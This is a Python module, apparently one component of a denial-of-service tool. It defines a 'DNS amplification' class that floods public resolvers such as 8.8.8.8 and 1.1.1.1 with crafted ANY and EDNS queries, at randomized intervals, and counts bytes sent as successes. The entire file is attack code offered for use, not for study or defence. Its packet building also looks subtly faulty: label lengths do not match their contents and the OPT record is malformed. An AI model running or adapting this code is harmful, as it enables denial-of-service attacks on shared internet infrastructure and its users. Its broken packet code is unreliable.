import asyncio
import random
import socket
import struct
import os
import aiohttp
from aiohttp import ClientTimeout, ClientError

class AmplificacionDNS:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        try:
            servidores_dns = [
                "8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", 
                "8.26.56.26", "64.6.64.6", "156.154.70.1", "199.85.126.10"
            ]
            
            for _ in range(5):
                dns_query = self._generar_consulta_dnssec()
                servidor = random.choice(servidores_dns)
                
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(2)
                sock.sendto(dns_query, (servidor, 53))
                
                consulta_any = self._generar_consulta_any()
                sock.sendto(consulta_any, (servidor, 53))
                
                sock.close()
                
                self.motor.estadisticas.agregar_exito(len(dns_query) + len(consulta_any))
                await asyncio.sleep(random.uniform(0.01, 0.05))
                
        except Exception:
            self.motor.estadisticas.agregar_error()
            
    def _generar_consulta_dnssec(self):
        transaction_id = random.randint(0, 65535)
        flags = 0x0100 
        qdcount = 1
        
        query = struct.pack('!HHHHHH', transaction_id, flags, qdcount, 0, 0, 0)
        
        num_labels = random.randint(5, 15)
        domain_parts = []
        for _ in range(num_labels):
            length = random.randint(3, 10)
            part = os.urandom(length).hex().encode()
            domain_parts.append(bytes([length]) + part)
        
        domain = b''.join(domain_parts) + b'\x00'
        query += domain
        
        query += struct.pack('!HH', 255, 1) 
        
        opt_record = b'\x00'
        opt_record += struct.pack('!HHHH', 41, 4096, 0x8000, 0) 
        query += opt_record
        
        return query
        
    def _generar_consulta_any(self):
        transaction_id = random.randint(0, 65535)
        flags = 0x0100
        qdcount = 1
        
        query = struct.pack('!HHHHHH', transaction_id, flags, qdcount, 0, 0, 0)
        
        domain = b'\x03' + os.urandom(3).hex().encode() + b'\x03com\x00'
        query += domain
        query += struct.pack('!HH', 255, 1)  
        
        return query